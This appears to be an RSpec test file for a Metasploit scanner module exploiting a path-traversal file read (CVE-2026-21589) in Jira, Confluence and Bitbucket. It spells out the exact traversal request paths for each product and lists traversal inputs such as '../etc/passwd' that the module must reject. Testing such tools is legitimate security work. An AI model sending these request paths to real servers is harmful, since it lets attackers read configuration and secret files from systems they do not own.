require 'spec_helper'

RSpec.describe 'Atlassian CVE-2026-21589 File Read' do
  include_context 'Msf::Simple::Framework#modules loading'

  subject(:mod) do
    load_and_create_module(
      module_type: 'auxiliary',
      reference_name: 'scanner/http/atlassian_cve_2026_21589_file_read'
    )
  end

  let(:host) { '192.0.2.10' }

  let(:jira_body) do
    '<web-app><listener-class>com.atlassian.jira.web.ServletContextProviderListener</listener-class></web-app>'
  end

  let(:confluence_body) do
    '<web-app><listener-class>com.atlassian.confluence.impl.webapp.ServletsInitializer</listener-class></web-app>'
  end

  let(:bitbucket_body) do
    '<web-app><listener-class>com.atlassian.plugin.servlet.ResourceDownloadUtils</listener-class></web-app>'
  end

  let(:response) do
    instance_double(
      Rex::Proto::Http::Response,
      code: 200,
      body: jira_body
    )
  end

  before do
    mod.datastore['RHOST'] = host
    mod.datastore['RPORT'] = 80
    mod.datastore['TARGETURI'] = '/'
    mod.datastore['PRODUCT'] = 'Jira'
    mod.datastore['FILEPATH'] = ''
  end

  describe '#selected_products' do
    it 'returns all supported products in automatic mode' do
      mod.datastore['PRODUCT'] = 'Auto'

      expect(mod.send(:selected_products)).to eq(%w[JIRA CONFLUENCE BITBUCKET])
    end

    {
      'Jira' => 'JIRA',
      'Confluence' => 'CONFLUENCE',
      'Bitbucket' => 'BITBUCKET'
    }.each do |option, expected|
      it "selects #{option} explicitly" do
        mod.datastore['PRODUCT'] = option

        expect(mod.send(:selected_products)).to eq([expected])
      end
    end
  end

  describe '#normalize_filepath' do
    it 'accepts a relative application file path' do
      expect(mod.send(:normalize_filepath, 'WEB-INF/web.xml')).to eq('WEB-INF/web.xml')
    end

    it 'removes a leading slash' do
      expect(mod.send(:normalize_filepath, '/WEB-INF/web.xml')).to eq('WEB-INF/web.xml')
    end

    [
      '',
      '../etc/passwd',
      'WEB-INF/../etc/passwd',
      'WEB-INF//web.xml',
      './WEB-INF/web.xml',
      'WEB-INF::web.xml',
      'WEB-INF/%2e%2e/etc/passwd',
      'WEB-INF/web.xml?download=1',
      'WEB-INF/web.xml#fragment',
      "WEB-INF/\x00web.xml",
      "WEB-INF/\nweb.xml",
      'WEB-INF/'
    ].each do |filepath|
      it "rejects an invalid path: #{filepath.inspect}" do
        expect(mod.send(:normalize_filepath, filepath)).to be_nil
      end
    end
  end

  describe '#request_file' do
    {
      'JIRA' => {
        path: '/download/resources/jira.webresources:color-picker-popup/images/..::..::..::..::..::WEB-INF::web.xml',
        file: 'WEB-INF/web.xml'
      },
      'CONFLUENCE' => {
        path: '/s/1/_/download/resources/com.atlassian.confluence.plugins.dashboard-actions/images/..::..::..::..::..::..::..::..::WEB-INF::web.xml',
        file: 'WEB-INF/web.xml'
      },
      'BITBUCKET' => {
        path: '/s/1.0/_/download/resources/com.atlassian.bitbucket.server.bitbucket-webpack-INTERNAL:avatar/avatar/..::..::..::..::..::WEB-INF::urlrewrite.xml',
        file: 'WEB-INF/urlrewrite.xml'
      }
    }.each do |product_name, expected|
      it "constructs the exact #{product_name} proof-of-concept URI" do
        product = mod.class::PRODUCTS.fetch(product_name)

        allow(mod).to receive(:send_request_cgi!).and_return(response)

        mod.send(:request_file, product, expected[:file])

        expect(mod).to have_received(:send_request_cgi!).with(
          hash_including(
            'method' => 'GET',
            'uri' => expected[:path],
            'encode_params' => false
          )
        )
      end
    end

    it 'does not send a request for an invalid file path' do
      product = mod.class::PRODUCTS.fetch('JIRA')

      expect(mod).not_to receive(:send_request_cgi!)

      expect(mod.send(:request_file, product, '../etc/passwd')).to be_nil
    end
  end

  describe '#run_host' do
    before do
      allow(mod).to receive(:store_loot).and_return('/tmp/loot/atlassian-file')
      allow(mod).to receive(:print_good)
      allow(mod).to receive(:print_error)
      allow(mod).to receive(:print_status)
      allow(mod).to receive(:vprint_status)
    end

    it 'detects Jira and stores the marker file when FILEPATH is empty' do
      allow(mod).to receive(:send_request_cgi!).and_return(response)

      mod.run_host(host)

      expect(mod).to have_received(:store_loot).with(
        'atlassian.cve_2026_21589.file',
        'application/octet-stream',
        host,
        jira_body,
        'web.xml',
        'Atlassian JIRA file: WEB-INF/web.xml'
      )
    end

    it 'detects Confluence using its product signature' do
      mod.datastore['PRODUCT'] = 'Confluence'
      confluence_response = instance_double(
        Rex::Proto::Http::Response,
        code: 200,
        body: confluence_body
      )
      allow(mod).to receive(:send_request_cgi!).and_return(confluence_response)

      mod.run_host(host)

      expect(mod).to have_received(:store_loot).with(
        'atlassian.cve_2026_21589.file',
        'application/octet-stream',
        host,
        confluence_body,
        'web.xml',
        'Atlassian CONFLUENCE file: WEB-INF/web.xml'
      )
    end

    it 'detects Bitbucket using its product signature' do
      mod.datastore['PRODUCT'] = 'Bitbucket'
      bitbucket_response = instance_double(
        Rex::Proto::Http::Response,
        code: 200,
        body: bitbucket_body
      )
      allow(mod).to receive(:send_request_cgi!).and_return(bitbucket_response)

      mod.run_host(host)

      expect(mod).to have_received(:store_loot).with(
        'atlassian.cve_2026_21589.file',
        'application/octet-stream',
        host,
        bitbucket_body,
        'urlrewrite.xml',
        'Atlassian BITBUCKET file: WEB-INF/urlrewrite.xml'
      )
    end

    it 'makes a second request to retrieve a custom file after detection' do
      mod.datastore['FILEPATH'] = 'WEB-INF/classes/example.properties'

      custom_response = instance_double(
        Rex::Proto::Http::Response,
        code: 200,
        body: 'example=value'
      )

      allow(mod).to receive(:send_request_cgi!).and_return(response, custom_response)

      mod.run_host(host)

      expect(mod).to have_received(:send_request_cgi!).twice
      expect(mod).to have_received(:store_loot).with(
        'atlassian.cve_2026_21589.file',
        'application/octet-stream',
        host,
        'example=value',
        'example.properties',
        'Atlassian JIRA file: WEB-INF/classes/example.properties'
      )
    end

    it 'falls through to Confluence when Jira does not match in Auto mode' do
      mod.datastore['PRODUCT'] = 'Auto'

      unrelated_response = instance_double(
        Rex::Proto::Http::Response,
        code: 200,
        body: '<html>Unrelated application</html>'
      )
      confluence_response = instance_double(
        Rex::Proto::Http::Response,
        code: 200,
        body: confluence_body
      )

      allow(mod).to receive(:send_request_cgi!).and_return(unrelated_response, confluence_response)

      mod.run_host(host)

      expect(mod).to have_received(:send_request_cgi!).twice
      expect(mod).to have_received(:store_loot).with(
        'atlassian.cve_2026_21589.file',
        'application/octet-stream',
        host,
        confluence_body,
        'web.xml',
        'Atlassian CONFLUENCE file: WEB-INF/web.xml'
      )
    end

    it 'does not send a second request for an invalid custom file path' do
      mod.datastore['FILEPATH'] = '../etc/passwd'
      allow(mod).to receive(:send_request_cgi!).and_return(response)

      mod.run_host(host)

      expect(mod).to have_received(:send_request_cgi!).once
      expect(mod).not_to have_received(:store_loot)
    end

    it 'does not store a response without a product signature' do
      unrecognized_response = instance_double(
        Rex::Proto::Http::Response,
        code: 200,
        body: '<html>Unrelated application</html>'
      )
      allow(mod).to receive(:send_request_cgi!).and_return(unrecognized_response)

      mod.run_host(host)

      expect(mod).not_to have_received(:store_loot)
    end

    it 'does not store a response when the marker request times out' do
      allow(mod).to receive(:send_request_cgi!).and_return(nil)

      mod.run_host(host)

      expect(mod).not_to have_received(:store_loot)
    end

    it 'does not store a custom file when its request fails' do
      mod.datastore['FILEPATH'] = 'WEB-INF/classes/example.properties'
      allow(mod).to receive(:send_request_cgi!).and_return(response, nil)

      mod.run_host(host)

      expect(mod).not_to have_received(:store_loot)
    end

    it 'saves a non-empty HTML HTTP 200 custom response without claiming its contents were verified' do
      mod.datastore['FILEPATH'] = 'WEB-INF/classes/example.properties'
      html_response = instance_double(
        Rex::Proto::Http::Response,
        code: 200,
        body: '<html><title>Application error</title></html>'
      )
      allow(mod).to receive(:send_request_cgi!).and_return(response, html_response)

      mod.run_host(host)

      expect(mod).to have_received(:store_loot).with(
        'atlassian.cve_2026_21589.file',
        'application/octet-stream',
        host,
        '<html><title>Application error</title></html>',
        'example.properties',
        'Atlassian JIRA file: WEB-INF/classes/example.properties'
      )
      expect(mod).to have_received(:print_status).with(
        /response content was not independently verified/
      )
    end

    it 'does not store an empty custom file response' do
      mod.datastore['FILEPATH'] = 'WEB-INF/classes/example.properties'
      empty_response = instance_double(
        Rex::Proto::Http::Response,
        code: 200,
        body: ''
      )
      allow(mod).to receive(:send_request_cgi!).and_return(response, empty_response)

      mod.run_host(host)

      expect(mod).not_to have_received(:store_loot)
    end

    it 'does not store a non-200 custom file response' do
      mod.datastore['FILEPATH'] = 'WEB-INF/classes/example.properties'
      failed_response = instance_double(
        Rex::Proto::Http::Response,
        code: 403,
        body: 'Forbidden'
      )
      allow(mod).to receive(:send_request_cgi!).and_return(response, failed_response)

      mod.run_host(host)

      expect(mod).not_to have_received(:store_loot)
    end
  end
end
